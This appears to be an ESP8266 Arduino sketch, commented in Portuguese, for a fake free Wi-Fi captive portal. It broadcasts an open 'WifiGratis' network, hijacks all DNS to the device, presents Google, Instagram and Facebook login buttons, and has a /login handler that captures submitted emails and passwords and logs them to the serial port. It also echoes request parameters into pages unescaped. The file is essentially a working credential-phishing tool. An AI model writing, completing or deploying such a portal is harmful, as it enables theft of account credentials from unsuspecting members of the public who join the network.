#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const char* ssid = "WifiGratis";
const char* password = "";

DNSServer dnsServer;
ESP8266WebServer webServer(80);

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, password);
  delay(100);

  // Configura o DNS server para redirecionar todas as requisições para o ESP8266
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Configuração da rota para a página inicial de seleção de login
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.on("/social", HTTP_GET, handleSocial); // Rota para a página de seleção de login

  // Manipulação para servir a página inicial de seleção de login automaticamente
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", String("/"), true);   // Redireciona para a rota principal "/"
    webServer.send(302, "text/plain", "");
  });

  webServer.begin();
  Serial.println("Captive portal started");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  // Página HTML principal
  String html = "<!DOCTYPE html>"
                "<html lang='en'>"
                "<head>"
                "<meta charset='UTF-8'>"
                "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                "<title>Autenticador Wi-Fi</title>"
                "<style>"
                "body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }"
                ".container { background-color: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); text-align: center; max-width: 400px; width: 100%; }"
                "h2 { color: #333; }"
                ".button-container { display: flex; flex-direction: column; align-items: center; }"
                ".social-button { margin: 10px 0; width: 80%; padding: 10px; border-radius: 5px; cursor: pointer; color: #ffffff; font-weight: bold; text-decoration: none; text-align: center; }"
                ".google { background-color: #db4437; }"
                ".instagram { background-color: #405de6; }"
                ".facebook { background-color: #1877f2; }"
                "</style>"
                "</head>"
                "<body>"
                "<div class='container'>"
                "<h2>WiFi Authenticator</h2>"
                "<div class='button-container'>"
                "<a href='/social?platform=Google' class='social-button google'>Login com Google</a>"
                "<a href='/social?platform=Instagram' class='social-button instagram'>Login com Instagram</a>"
                "<a href='/social?platform=Facebook' class='social-button facebook'>Login com Facebook</a>"
                "</div>"
                "</div>"
                "</body>"
                "</html>";

  webServer.send(200, "text/html", html);
}

void handleLogin() {
  // Manipulação do formulário de login (exemplo básico)
  String email = webServer.arg("email");
  String password = webServer.arg("password");
  Serial.print("Email entered: ");
  Serial.println(email);
  Serial.print("Password entered: ");
  Serial.println(password);
  webServer.send(200, "text/html", "<h1>Login successful</h1><p>You entered:</p><p>Email: " + email + "</p><p>Password: " + password + "</p>");
}

void handleSocial() {
  // Página HTML secundária para redirecionamento das redes sociais
  String platform = webServer.arg("platform");
  String html = "<!DOCTYPE html>"
                "<html lang='en'>"
                "<head>"
                "<meta charset='UTF-8'>"
                "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                "<title>Autenticador Wi-Fi - " + platform + "</title>"
                "<style>"
                "body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }"
                ".container { background-color: #ffffff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); text-align: center; max-width: 400px; width: 100%; }"
                "h2 { color: #333; }"
                "</style>"
                "</head>"
                "<body>"
                "<div class='container'>"
                "<h2>WiFi Authenticator - " + platform + "</h2>"
                "<p>Aqui você poderia adicionar o código específico para autenticação com " + platform + ".</p>"
                "</div>"
                "</body>"
                "</html>";

  webServer.send(200, "text/html", html);
}
